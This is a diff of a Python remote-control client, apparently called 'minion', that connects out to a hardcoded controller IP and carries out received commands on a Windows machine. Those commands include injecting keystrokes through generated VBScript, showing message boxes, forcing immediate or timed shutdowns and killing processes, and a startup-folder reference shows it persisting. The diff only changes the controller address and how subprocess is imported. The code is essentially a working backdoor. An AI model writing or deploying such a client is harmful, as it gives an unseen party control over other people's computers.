@@ -1,11 +1,12 @@
 #!/usr/bin/python
-import socket, time, subprocess, sys, os, urllib, pyttsx
+import socket, time, sys, os, urllib, pyttsx
+from subprocess import call
 #from pathlib import Path
 while True:
     s = socket.socket()
     port = 12345
     try:
-        s.connect(('192.168.1.135', port))
+        s.connect(('10.64.41.234', port))
         command = s.recv(1024)
         print("Command recieved: "+command)
     except socket.error as err:
@@ -32,7 +33,7 @@ wscript.sleep 1000
 wshshell.sendkeys keyboardtext
                 ''')
                 k.close
-        subprocess.call(["wscript",finalpathk,message[1]])
+        call(["wscript",finalpathk,message[1]])
 
     elif "message" in str(command1[0]):
         message = command.split(" ",1)
@@ -46,27 +47,27 @@ wshshell.sendkeys keyboardtext
                 f.write('messageText = objArgs(0)\n')
                 f.write('MsgBox messageText')
                 f.close
-        subprocess.call(["wscript",finalpathm,message[1]])
+        call(["wscript",finalpathm,message[1]])
     
     elif "cancel" in str(command1[0]):
         print("Stopping wscript.exe services")
-        subprocess.call(["taskkill", "/f", "/im", "wscript.exe"])
+        call(["taskkill", "/f", "/im", "wscript.exe"])
         print("Cancelling shutdown command")
-        subprocess.call(["shutdown", "-a"])
+        call(["shutdown", "-a"])
         time.sleep(5)
 
     elif "shutdown" in str(command1[0]):
         print("Shutting down computer")
-        subprocess.call(["shutdown", "-s", "-t", "20"])
-        time.sleep(10)
+        call(["shutdown", "-s", "-t", "20"])
+        time.sleep(5)
 
     elif "test" in str(command1[0]):
         print("Initiating test module")
-        subprocess.call(["calc"])
+        call(["calc"])
 
     elif "disable" in str(command1[0]):
         print("Stopping wscript.exe services")
-        subprocess.call(["taskkill", "/f", "/im", "wscript.exe"])
+        call(["taskkill", "/f", "/im", "wscript.exe"])
         sys.exit()
 
     elif "opencd" in str(command1[0]):
@@ -185,7 +186,7 @@ loop
             #print("Not restarting becouse minion isnt installed in startup folder")
             #time.sleep(10)
     elif "instantshutdown" in str(command1[0]):
-        subprocess.call(["shutdown", "-s", "-t", "0"])
+        call(["shutdown", "-s", "-t", "0"])
     
     elif "tts" in str(command1[0]):
         print("Text 2 Speech")
